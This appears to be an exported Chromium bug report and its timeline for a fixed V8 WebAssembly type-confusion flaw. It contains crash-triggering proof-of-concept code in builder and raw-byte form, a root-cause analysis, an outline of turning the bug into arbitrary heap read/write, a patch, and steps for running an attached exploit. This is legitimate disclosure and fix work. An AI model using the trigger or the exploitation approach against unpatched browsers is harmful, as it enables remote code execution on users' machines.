# Security: Type Confusion in V8 WebAssembly, leading to RCE

| Field | Value |
|-------|-------|
| **Issue ID** | [40067050](https://issues.chromium.org/issues/40067050) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | ma...@chromium.org |
| **Created** | 2023-07-07 |
| **Bounty** | $20,000.00 |

## Description

VULNERABILITY DETAILS
## BISECT1
After bisect, it was determined that following commit caused this problem.

- Commit Info
    - Version: 85705
    - link: https://crrev.com/455d38ff8df7303474e8ead05cad659aac0a1bbc 
- Commit Message

```
commit 455d38ff8df7303474e8ead05cad659aac0a1bbc
Author: Manos Koukoutos <manoskouk@chromium.org>
Date:   Mon Feb 6 14:12:58 2023 +0100

    Reland "[wasm-gc] Introduce wasm null object"
    
    This is a reland of commit 2e357c4814954c6d83c336655209e14aa53911d4
    
    Difference compared to original: Initialize wasm-null object's
    payload.
    
    Original change's description:
    > [wasm-gc] Introduce wasm null object
    >
    > We introduce a wasm null object, separate from JS null. Its purpose is
    > to support trapping null accesses for wasm objects.
    > This will be achieved by allocating a large payload for it (larger than
    > any wasm struct) and memory-protecting it (see linked CL). The two null
    > objects get mapped to each other at the wasm-JS boundary.
    > Since externref objects live on the JS side of the boundary,
    > null-related instructions in wasm now need an additional type argument
    > to handle the correct null object.
    >
    > Bug: v8:7748
    > Change-Id: I06da00fcd279cc5376e69ab7858e3782f5b5081e
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4200639
    > Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    > Reviewed-by: Michael Lippautz <mlippautz@chromium.org>
    > Commit-Queue: Manos Koukoutos <manoskouk@chromium.org>
    > Cr-Commit-Position: refs/heads/main@{#85648}
    
    Bug: v8:7748
    Change-Id: I46413d05f0213229f1d19277ae98dbb8df5afdf9
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4224011
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org>
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Manos Koukoutos <manoskouk@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#85705}

```

## BISECT2
After testing, it can affect chrome stable, dev and canary through origin trials. The specific version numbers are as follows:
Chrome Stable 114.0.5735.199
Chrome Dev 116.0.5845.14
Chrome Canary 117.0.5876.1

The Origin url I specified is http://localhost:8000
So by using the corresponding browser to visit http://localhost:8000/poc.html, you can verify the vulnerability in chrome.
Please do not modify the URL.

## POC
```
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const builder = new WasmModuleBuilder();

builder.addStruct([makeField(wasmRefNullType(kWasmStructRef), true)]);

builder.addType(makeSig([], []));
builder.addType(makeSig([wasmRefNullType(0)], []));

builder.addTable(kWasmFuncRef, 2, 2, undefined);

builder.addFunction(undefined, 1 /* sig */)
  .addBodyWithEnd([
    kExprRefNull, 0x0,  // ref.null
    kExprCallFunction, 0x01,  // call function #1
    kExprEnd,  // end
]);

builder.addFunction(undefined, 2 /* sig */)
  .addBodyWithEnd([
    kExprLocalGet, 0x0,  // local.get
    kGCPrefix, kExprExternExternalize,  // extern.externalize
    kExprLocalGet, 0x0,  // local.get
    kGCPrefix, kExprStructGet, 0x00, 0x00,  // struct.get
    kGCPrefix, kExprRefCast, 0x0,  // ref.cast null

    kExprDrop,  // drop
    kExprDrop,  // drop
    kExprEnd,  // end
]);
builder.addExport('main', 0);
const instance = builder.instantiate();
instance.exports.main();
```

Or:

```
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,16,3,80,0,95,1,108,103,1,96,0,0,96,1,108,0,0,3,3,2,1,2,4,5,1,112,1,2,2,7,8,1,4,109,97,105,110,0,0,10,26,2,6,0,208,0,16,1,11,17,0,32,0,251,113,32,0,251,3,0,0,251,65,0,26,26,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var wasm_function = wasm_instance.exports.main;
wasm_function()
```

If nothing else, this will directly cause V8 to crash because an illegal address 0xxxxffffffff is being accessed.

## Root Cause

[0] When calling a function in WebAssembly, the parameters can be stored either on the stack or in registers. In the given example, when `function(0)` calls `function(1)`, the parameter `NullRef` is stored in the `rax` register and recorded at the top of the `cache_state` stack.

code:
```
builder.addFunction(undefined, makeSig([], []))
  .addBodyWithEnd([
    kExprRefNull, 0x0,
    kExprCallFunction, 0x01,
    kExprEnd,
  ]);

builder.addFunction(undefined, makeSig([wasmRefNullType(0)], []))
  .addBodyWithEnd([
    ......
  ]);
```

Register:
```
rax: RefNull(0),
rbx: ......
rcx: ......
......
```

cache_state:
```
--------------------
|                  |
|                  |
|                  |
--------------------
|       rax        |
--------------------
```

[1] Each function needs to keep the stack frame balanced. Therefore, we cannot directly use the value in `rax`. Instead, we need to execute a `LocalGet` operation to create a copy of this parameter and add it to the `cache_state`.

code:
```
builder.addFunction(undefined, makeSig([wasmRefNullType(0)], []))
  .addBodyWithEnd([
    kExprLocalGet, 0,
    ......
  ]);
```

cache_state:
```
--------------------
|                  |
|                  |
--------------------
|       rax        |
--------------------
|       rax        |
--------------------
```
Therefore, we can never pop the bottom `rax` from the `cache_state`. In other words, `rax` is always in the "in use" state, and as a result, the value in `rax` can only be read but cannot be changed.

[2] However, the `extern.externalize` breaks this behavior. It directly modifies the contents of the read register.

src/wasm/baseline/liftoff-compiler.cc:
```
case kExprExternExternalize: {
    LiftoffRegList pinned;
    LiftoffRegister ref = pinned.set(__ PopToRegister(pinned)); // ===> [2]
    LiftoffRegister null = __ GetUnusedRegister(kGpReg, pinned);
    LoadNullValueForCompare(null.gp(), pinned, kWasmAnyRef);
    Label label;
    {
        FREEZE_STATE(frozen);
        __ emit_cond_jump(kNotEqual, &label, kRefNull, ref.gp(), null.gp(),
                        frozen);
        LoadNullValue(ref.gp(), kWasmExternRef); // ===> [2]
        __ bind(&label);
    }
    __ PushRegister(kRefNull, ref);
    return;
}
```
This vulnerability may allow an attacker to modify the registers storing function parameters, such as `rax`, resulting in a type confusion of `externref` and `RefNull`.

## Exploit
[0] The `extern.externalize` modifies `rax` to an address close to the base address of the V8 heap space, for example, `0x120600000235` in the figure below:
```
*RAX  0x120600000235 ◂— 0x1 // ===> [0]
*RBX  0xfffd
*RCX  0x120600000000 ◂— 0x40000
*RDX  0x1206001b4f85 ◂— 0x164f000300000000
*RDI  0x13944c3d778b ◂— sub rsp, 8 /* 0x4800000008ec8148 */
*RSI  0x1206001b4e85 ◂— 0x1900000219001999
*R8   0x555556b8c0a8 ◂— 0x0
*R9   0x12060006b1b9 ◂— 0x1900000219001995
*R10  0x7ffff7fc9090
*R11  0x59b6f22c
*R12  0x2
*R13  0x555556b2e0d0 —▸ 0x5555566e8800 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xb]
*R14  0x120600000000 ◂— 0x40000
*R15  0x120600000219 ◂— 0xb100000000000000
*RBP  0x7fffffffcec0 —▸ 0x7fffffffcef0 —▸ 0x7fffffffcf10 —▸ 0x7fffffffd0c0 —▸ 0x7fffffffd140 ◂— ...
*RSP  0x7fffffffcea0 —▸ 0x13944c3d778b ◂— sub rsp, 8 /* 0x4800000008ec8148 */
*RIP  0x13944c3d77e2 ◂— mov ebx, dword ptr [rcx - 1] /* 0xda3bde0349ff598b */
```

[1] We can use `0x120600000235` as a pointer to a structure, and the structure can be defined by us.

[2] Furthermore, we can define references within our structure, enabling us to interpret a pointer on the V8 heap as a new structure pointer. This serves as a springboard, allowing us to achieve arbitrary read and write capabilities within the V8 heap address space.

## Fix
Maybe we should use a new register to store the result of `extern.externalize`. Here is a possible fix that has been tested to prevent the bug:

```
--- a/src/wasm/baseline/liftoff-compiler.cc
+++ b/src/wasm/baseline/liftoff-compiler.cc
@@ -1989,16 +1989,18 @@ class LiftoffCompiler {
         LiftoffRegList pinned;
         LiftoffRegister ref = pinned.set(__ PopToRegister(pinned));
         LiftoffRegister null = __ GetUnusedRegister(kGpReg, pinned);
+        pinned.set(null);
+        LiftoffRegister dst = __ GetUnusedRegister(kGpReg, pinned);
         LoadNullValueForCompare(null.gp(), pinned, kWasmAnyRef);
         Label label;
         {
           FREEZE_STATE(frozen);
           __ emit_cond_jump(kNotEqual, &label, kRefNull, ref.gp(), null.gp(),
                             frozen);
-          LoadNullValue(ref.gp(), kWasmExternRef);
+          LoadNullValue(dst.gp(), kWasmExternRef);
           __ bind(&label);
         }
-        __ PushRegister(kRefNull, ref);
+        __ PushRegister(kRefNull, dst);
         return;
       }
       default:
```



## REPRODUCE EXPLOIT
I wrote exploit in d8 11.7.100:

Build V8 version 11.7.100:
```
git checkout 11.7.100 && gclient sync -D
tools/dev/gm.py x64.release
```
Run the exp:
```
out/x64.release/d8 --experimental-wasm-gc exp.js
```

Alternatively, you can download the V8 release version from the following location: gs://v8-asan/linux-release/d8-linux-release-v8-component-88760.zip. After downloading, run the exp using the following command:
```
d8-linux-release-v8-component-88760/d8 --experimental-wasm-gc exp.js
```

## Other
Please note to include the flags `--experimental-wasm-gc` for clusterfuzz classification.

VERSION
Tested on v8 version: 11.2.0 - 11.7.0

REPRODUCTION CASE
1. Download release v8 from: gs://v8-asan/linux-release/d8-linux-release-v8-component-88760.zip
2. Run: `d8 --experimental-wasm-gc poc.js`

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab

## CREDIT INFORMATION
Jerry

## Attachments

- [exp.js](attachments/exp.js) (text/plain, 74.7 KB)
- [poc.js](attachments/poc.js) (text/plain, 412 B)
- [poc.html](attachments/poc.html) (text/plain, 926 B)
- [fix.patch](attachments/fix.patch) (text/plain, 1.0 KB)
- [fix.patch](attachments/fix.patch) (text/plain, 1.0 KB)
- [poc.html](attachments/poc.html) (text/plain, 926 B)
- [poc.js](attachments/poc.js) (text/plain, 412 B)
- [exp.js](attachments/exp.js) (text/plain, 74.7 KB)

## Timeline

### je...@gmail.com (2023-07-07)

Title : Type Confusion in V8 WebAssembly, leading to RCE

VULNERABILITY DETAILS
## BISECT1
After bisect, it was determined that following commit caused this problem.

- Commit Info
    - Version: 85705
    - link: https://crrev.com/455d38ff8df7303474e8ead05cad659aac0a1bbc 
- Commit Message

```
commit 455d38ff8df7303474e8ead05cad659aac0a1bbc
Author: Manos Koukoutos <manoskouk@chromium.org>
Date:   Mon Feb 6 14:12:58 2023 +0100

    Reland "[wasm-gc] Introduce wasm null object"
    
    This is a reland of commit 2e357c4814954c6d83c336655209e14aa53911d4
    
    Difference compared to original: Initialize wasm-null object's
    payload.
    
    Original change's description:
    > [wasm-gc] Introduce wasm null object
    >
    > We introduce a wasm null object, separate from JS null. Its purpose is
    > to support trapping null accesses for wasm objects.
    > This will be achieved by allocating a large payload for it (larger than
    > any wasm struct) and memory-protecting it (see linked CL). The two null
    > objects get mapped to each other at the wasm-JS boundary.
    > Since externref objects live on the JS side of the boundary,
    > null-related instructions in wasm now need an additional type argument
    > to handle the correct null object.
    >
    > Bug: v8:7748
    > Change-Id: I06da00fcd279cc5376e69ab7858e3782f5b5081e
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4200639
    > Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    > Reviewed-by: Michael Lippautz <mlippautz@chromium.org>
    > Commit-Queue: Manos Koukoutos <manoskouk@chromium.org>
    > Cr-Commit-Position: refs/heads/main@{#85648}
    
    Bug: v8:7748
    Change-Id: I46413d05f0213229f1d19277ae98dbb8df5afdf9
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4224011
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org>
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Manos Koukoutos <manoskouk@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#85705}

```

## BISECT2
After testing, it can affect chrome stable, dev and canary through origin trials. The specific version numbers are as follows:
Chrome Stable 114.0.5735.199
Chrome Dev 116.0.5845.14
Chrome Canary 117.0.5876.1

The Origin url I specified is http://localhost:8000
So by using the corresponding browser to visit http://localhost:8000/poc.html, you can verify the vulnerability in chrome.
Please do not modify the URL.

## POC
```
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const builder = new WasmModuleBuilder();

builder.addStruct([makeField(wasmRefNullType(kWasmStructRef), true)]);

builder.addType(makeSig([], []));
builder.addType(makeSig([wasmRefNullType(0)], []));

builder.addTable(kWasmFuncRef, 2, 2, undefined);

builder.addFunction(undefined, 1 /* sig */)
  .addBodyWithEnd([
    kExprRefNull, 0x0,  // ref.null
    kExprCallFunction, 0x01,  // call function #1
    kExprEnd,  // end
]);

builder.addFunction(undefined, 2 /* sig */)
  .addBodyWithEnd([
    kExprLocalGet, 0x0,  // local.get
    kGCPrefix, kExprExternExternalize,  // extern.externalize
    kExprLocalGet, 0x0,  // local.get
    kGCPrefix, kExprStructGet, 0x00, 0x00,  // struct.get
    kGCPrefix, kExprRefCast, 0x0,  // ref.cast null

    kExprDrop,  // drop
    kExprDrop,  // drop
    kExprEnd,  // end
]);
builder.addExport('main', 0);
const instance = builder.instantiate();
instance.exports.main();
```

Or:

```
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,16,3,80,0,95,1,108,103,1,96,0,0,96,1,108,0,0,3,3,2,1,2,4,5,1,112,1,2,2,7,8,1,4,109,97,105,110,0,0,10,26,2,6,0,208,0,16,1,11,17,0,32,0,251,113,32,0,251,3,0,0,251,65,0,26,26,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var wasm_function = wasm_instance.exports.main;
wasm_function()
```

If nothing else, this will directly cause V8 to crash because an illegal address 0xxxxffffffff is being accessed.

## Root Cause

[0] When calling a function in WebAssembly, the parameters can be stored either on the stack or in registers. In the given example, when `function(0)` calls `function(1)`, the parameter `NullRef` is stored in the `rax` register and recorded at the top of the `cache_state` stack.

code:
```
builder.addFunction(undefined, makeSig([], []))
  .addBodyWithEnd([
    kExprRefNull, 0x0,
    kExprCallFunction, 0x01,
    kExprEnd,
  ]);

builder.addFunction(undefined, makeSig([wasmRefNullType(0)], []))
  .addBodyWithEnd([
    ......
  ]);
```

Register:
```
rax: RefNull(0),
rbx: ......
rcx: ......
......
```

cache_state:
```
--------------------
|                  |
|                  |
|                  |
--------------------
|       rax        |
--------------------
```

[1] Each function needs to keep the stack frame balanced. Therefore, we cannot directly use the value in `rax`. Instead, we need to execute a `LocalGet` operation to create a copy of this parameter and add it to the `cache_state`.

code:
```
builder.addFunction(undefined, makeSig([wasmRefNullType(0)], []))
  .addBodyWithEnd([
    kExprLocalGet, 0,
    ......
  ]);
```

cache_state:
```
--------------------
|                  |
|                  |
--------------------
|       rax        |
--------------------
|       rax        |
--------------------
```
Therefore, we can never pop the bottom `rax` from the `cache_state`. In other words, `rax` is always in the "in use" state, and as a result, the value in `rax` can only be read but cannot be changed.

[2] However, the `extern.externalize` breaks this behavior. It directly modifies the contents of the read register.

src/wasm/baseline/liftoff-compiler.cc:
```
case kExprExternExternalize: {
    LiftoffRegList pinned;
    LiftoffRegister ref = pinned.set(__ PopToRegister(pinned)); // ===> [2]
    LiftoffRegister null = __ GetUnusedRegister(kGpReg, pinned);
    LoadNullValueForCompare(null.gp(), pinned, kWasmAnyRef);
    Label label;
    {
        FREEZE_STATE(frozen);
        __ emit_cond_jump(kNotEqual, &label, kRefNull, ref.gp(), null.gp(),
                        frozen);
        LoadNullValue(ref.gp(), kWasmExternRef); // ===> [2]
        __ bind(&label);
    }
    __ PushRegister(kRefNull, ref);
    return;
}
```
This vulnerability may allow an attacker to modify the registers storing function parameters, such as `rax`, resulting in a type confusion of `externref` and `RefNull`.

## Exploit
[0] The `extern.externalize` modifies `rax` to an address close to the base address of the V8 heap space, for example, `0x120600000235` in the figure below:
```
*RAX  0x120600000235 ◂— 0x1 // ===> [0]
*RBX  0xfffd
*RCX  0x120600000000 ◂— 0x40000
*RDX  0x1206001b4f85 ◂— 0x164f000300000000
*RDI  0x13944c3d778b ◂— sub rsp, 8 /* 0x4800000008ec8148 */
*RSI  0x1206001b4e85 ◂— 0x1900000219001999
*R8   0x555556b8c0a8 ◂— 0x0
*R9   0x12060006b1b9 ◂— 0x1900000219001995
*R10  0x7ffff7fc9090
*R11  0x59b6f22c
*R12  0x2
*R13  0x555556b2e0d0 —▸ 0x5555566e8800 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xb]
*R14  0x120600000000 ◂— 0x40000
*R15  0x120600000219 ◂— 0xb100000000000000
*RBP  0x7fffffffcec0 —▸ 0x7fffffffcef0 —▸ 0x7fffffffcf10 —▸ 0x7fffffffd0c0 —▸ 0x7fffffffd140 ◂— ...
*RSP  0x7fffffffcea0 —▸ 0x13944c3d778b ◂— sub rsp, 8 /* 0x4800000008ec8148 */
*RIP  0x13944c3d77e2 ◂— mov ebx, dword ptr [rcx - 1] /* 0xda3bde0349ff598b */
```

[1] We can use `0x120600000235` as a pointer to a structure, and the structure can be defined by us.

[2] Furthermore, we can define references within our structure, enabling us to interpret a pointer on the V8 heap as a new structure pointer. This serves as a springboard, allowing us to achieve arbitrary read and write capabilities within the V8 heap address space.

## Fix
Maybe we should use a new register to store the result of `extern.externalize`. Here is a possible fix that has been tested to prevent the bug:

```
--- a/src/wasm/baseline/liftoff-compiler.cc
+++ b/src/wasm/baseline/liftoff-compiler.cc
@@ -1989,16 +1989,18 @@ class LiftoffCompiler {
         LiftoffRegList pinned;
         LiftoffRegister ref = pinned.set(__ PopToRegister(pinned));
         LiftoffRegister null = __ GetUnusedRegister(kGpReg, pinned);
+        pinned.set(null);
+        LiftoffRegister dst = __ GetUnusedRegister(kGpReg, pinned);
         LoadNullValueForCompare(null.gp(), pinned, kWasmAnyRef);
         Label label;
         {
           FREEZE_STATE(frozen);
           __ emit_cond_jump(kNotEqual, &label, kRefNull, ref.gp(), null.gp(),
                             frozen);
-          LoadNullValue(ref.gp(), kWasmExternRef);
+          LoadNullValue(dst.gp(), kWasmExternRef);
           __ bind(&label);
         }
-        __ PushRegister(kRefNull, ref);
+        __ PushRegister(kRefNull, dst);
         return;
       }
       default:
```



## REPRODUCE EXPLOIT
I wrote exploit in d8 11.7.100:

Build V8 version 11.7.100:
```
git checkout 11.7.100 && gclient sync -D
tools/dev/gm.py x64.release
```
Run the exp:
```
out/x64.release/d8 --experimental-wasm-gc exp.js
```

Alternatively, you can download the V8 release version from the following location: gs://v8-asan/linux-release/d8-linux-release-v8-component-88760.zip. After downloading, run the exp using the following command:
```
d8-linux-release-v8-component-88760/d8 --experimental-wasm-gc exp.js
```

## Other
Please note to include the flags `--experimental-wasm-gc` for clusterfuzz classification.

VERSION
Tested on v8 version: 11.2.0 - 11.7.0

REPRODUCTION CASE
1. Download release v8 from: gs://v8-asan/linux-release/d8-linux-release-v8-component-88760.zip
2. Run: `d8 --experimental-wasm-gc poc.js`

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab

## CREDIT INFORMATION
Jerry

### [Deleted User] (2023-07-07)

[Empty comment from Monorail migration]

### ti...@google.com (2023-07-07)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-07-07)

Detailed Report: https://clusterfuzz.com/testcase?key=5107068916400128

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7eb1ffffffff
Crash State:
  Builtins_NewGenericJSToWasmWrapper
  Builtins_JSToWasmWrapper
  Builtins_InterpreterEntryTrampoline
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&revision=88762

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5107068916400128

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### sa...@google.com (2023-07-07)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-07-07)

[Empty comment from Monorail migration]

### je...@gmail.com (2023-07-07)

[Comment Deleted]

### je...@gmail.com (2023-07-07)

[Comment Deleted]

### am...@chromium.org (2023-07-07)

Thank you for the great report, Jerry! 

I'm not the current shepherd on duty, but I got notice of this bug so I can shepherd this one to get it visible to V8 sooner than later 

even though CF believes this is just a READ, this is type confusion -> RCE in the renderer == high severity
bisects back 112, 114 is currently oldest active release channel == FoundIn-114 
wasm-gc is in OT since 112, so the SI-Extended that will result from FoundIn-114 is accurate 

assigning to manoskouk@ based on bisect, cc'ing jkummerow@ based on work on wasm-gc as well 


### [Deleted User] (2023-07-07)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-08)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ma...@chromium.org (2023-07-10)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript>WebAssembly]

### gi...@appspot.gserviceaccount.com (2023-07-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/65a913ada7c46baaab65580e31b4d3cc2114973f

commit 65a913ada7c46baaab65580e31b4d3cc2114973f
Author: Manos Koukoutos <manoskouk@chromium.org>
Date: Mon Jul 10 08:32:59 2023

[wasm-gc][liftoff] Fix bug

Bug: chromium:1462951
Change-Id: I16fb8e2b989f5501c93b55d61a2bb603d5987655
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4675296
Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
Auto-Submit: Manos Koukoutos <manoskouk@chromium.org>
Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
Cr-Commit-Position: refs/heads/main@{#88782}

[modify] https://crrev.com/65a913ada7c46baaab65580e31b4d3cc2114973f/src/wasm/baseline/liftoff-compiler.cc


### ma...@chromium.org (2023-07-10)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-07-10)

ClusterFuzz testcase 5107068916400128 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=88781:88782

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### [Deleted User] (2023-07-10)

[Empty comment from Monorail migration]

### [Deleted User] (2023-07-10)

[Empty comment from Monorail migration]

### je...@gmail.com (2023-07-11)

[Comment Deleted]

### [Deleted User] (2023-07-11)

This high+ V8 security issue with stable impact requires a lightweight post mortem. Please take some time to answer questions asked in this form [1] to help us improve V8 security. [1] https://docs.google.com/forms/d/e/1FAIpQLSdSMCiEpIFLLFkMbgtulK1sf1B-idQmkFaA4XP2Rz5mN1cqWg/viewform?usp=pp_url&entry.307501673=1462951&entry.364066060=External&entry.958145677=Android&entry.958145677=Chrome&entry.958145677=Fuchsia&entry.958145677=Linux&entry.958145677=Mac&entry.958145677=Windows&entry.958145677=Lacros&entry.763880440=Extended&entry.1678852700=High&entry.763402679=Blink>JavaScript>WebAssembly&entry.975983575=manoskouk@chromium.org Please ensure to copy the full link, as otherwise some issue meta data might not be populated automatically. 

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-07-11)

Merge approved: your change passed merge requirements and is auto-approved for M116. Please go ahead and merge the CL to branch 5845 (refs/branch-heads/5845) manually. Please contact milestone owner if you have questions.
Merge instructions: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md
Owners: eakpobaro (Android), eakpobaro (iOS), obenedict (ChromeOS), danielyip (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-07-11)

Merge review required: M115 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), dgagnon (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-07-11)

Merge review required: M114 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ma...@chromium.org (2023-07-11)

[Empty comment from Monorail migration]

### jk...@chromium.org (2023-07-11)

#19: Done.

### jk...@chromium.org (2023-07-11)

#20: Merge in progress.

#21/#22:

1.) Security fix
2.) https://chromium-review.googlesource.com/c/v8/v8/+/4677663
3.) Yes, 117.0.5882.0.
4.) Yes, new feature, in Origin Trial, no Finch experiments.
5.) n/a
6.) No manual testing required.

### gi...@appspot.gserviceaccount.com (2023-07-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/92a908e24a0150eca0c31ada47db7f5db71ffd4c

commit 92a908e24a0150eca0c31ada47db7f5db71ffd4c
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Tue Jul 11 11:38:53 2023

[wasm-gc] Merge a few fixes

This commit cherry-picks small parts of:
crrev.com/c/4669597
crrev.com/c/4675296
crrev.com/c/4677170
that are suitable for backmerging.

Bug: chromium:1462951
Change-Id: I4b93518b896119768834272ab7642afa4cfabaaf
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4677662
Commit-Queue: Manos Koukoutos <manoskouk@chromium.org>
Reviewed-by: Manos Koukoutos <manoskouk@chromium.org>
Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
Auto-Submit: Jakob Kummerow <jkummerow@chromium.org>
Cr-Commit-Position: refs/branch-heads/11.6@{#16}
Cr-Branched-From: e29c028f391389a7a60ee37097e3ca9e396d6fa4-refs/heads/11.6.189@{#3}
Cr-Branched-From: 95cbef20e2aa556a1ea75431a48b36c4de6b9934-refs/heads/main@{#88340}

[modify] https://crrev.com/92a908e24a0150eca0c31ada47db7f5db71ffd4c/src/wasm/wasm-objects.cc
[modify] https://crrev.com/92a908e24a0150eca0c31ada47db7f5db71ffd4c/test/unittests/wasm/function-body-decoder-unittest.cc
[modify] https://crrev.com/92a908e24a0150eca0c31ada47db7f5db71ffd4c/src/wasm/baseline/liftoff-compiler.cc
[modify] https://crrev.com/92a908e24a0150eca0c31ada47db7f5db71ffd4c/src/wasm/function-body-decoder-impl.h


### [Deleted User] (2023-07-11)

LTS Milestone M114

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2023-07-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/8d01f1b988464c6d3e53fb0eb950a36a846a7b11

commit 8d01f1b988464c6d3e53fb0eb950a36a846a7b11
Author: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Jul 11 17:42:55 2023

Roll v8 11.6 from 1f2fd1eb67e4 to 762df8e03839 (2 revisions)

https://chromium.googlesource.com/v8/v8.git/+log/1f2fd1eb67e4..762df8e03839

2023-07-11 v8-ci-autoroll-builder@chops-service-accounts.iam.gserviceaccount.com Version 11.6.189.11
2023-07-11 jkummerow@chromium.org [wasm-gc] Merge a few fixes

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/v8-11-6-chromium-m116
Please CC liviurau@google.com,v8-waterfall-sheriff@grotations.appspotmail.com,vahl@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in v8 11.6: https://bugs.chromium.org/p/v8/issues/entry
To file a bug in Chromium m116: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Bug: chromium:1462951
Tbr: v8-waterfall-sheriff@grotations.appspotmail.com
Change-Id: I455ac995d17ce047a790f6d35016f69e1d7bbddd
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4677877
Commit-Queue: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Bot-Commit: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
